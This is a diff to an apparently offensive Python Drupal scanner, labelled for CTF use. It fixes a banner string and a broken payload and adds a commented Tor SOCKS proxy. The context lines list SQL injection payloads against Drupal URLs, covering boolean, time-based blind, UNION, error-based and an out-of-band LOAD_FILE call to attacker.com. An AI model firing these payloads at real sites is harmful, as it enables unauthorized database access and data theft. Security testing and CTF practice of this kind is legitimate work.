@@ -17,7 +17,7 @@ import os
 import base64
 
 # Banner
-BANNER = """
+BANNER = r"""
   ___  ___                              _   __  
  |   \/ __| __ __ _ _ _  _ _  ___ _ _  / | /  \ 
  | |) \__ \/ _/ _` | ' \| ' \/ -_) '_| | || () |
@@ -47,6 +47,7 @@ user_agents = [
 proxies = {
     # "http": "http://127.0.0.1:8080",  # Uncomment for proxy use
     # "https": "http://127.0.0.1:8080"
+    # "socks5": "socks5://127.0.0.1:9050"
 }
 
 # Expanded sensitive paths (CTF goldmine)
@@ -316,9 +317,7 @@ drupal_vulns = {
     # SQL Injection
     "SQLi Basic": {"path": "/node?title=1' OR '1'='1", "method": "GET"},
     "SQLi Blind Time": {"path": "/node?title=1' AND SLEEP(5)--", "method": "GET"},
-    "SQLi Union": {"path": "/node?sort=1 UNION SELECT NULL,database(),NULL --
-
-", "method": "GET"},
+    "SQLi Union": {"path": "/node?sort=1 UNION SELECT NULL,database(),NULL --", "method": "GET"},
     "SQLi Error": {"path": "/node?title=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--", "method": "GET"},
     "SQLi Out-of-Band": {"path": "/node?title=1' AND LOAD_FILE('http://attacker.com')--", "method": "GET"},
     
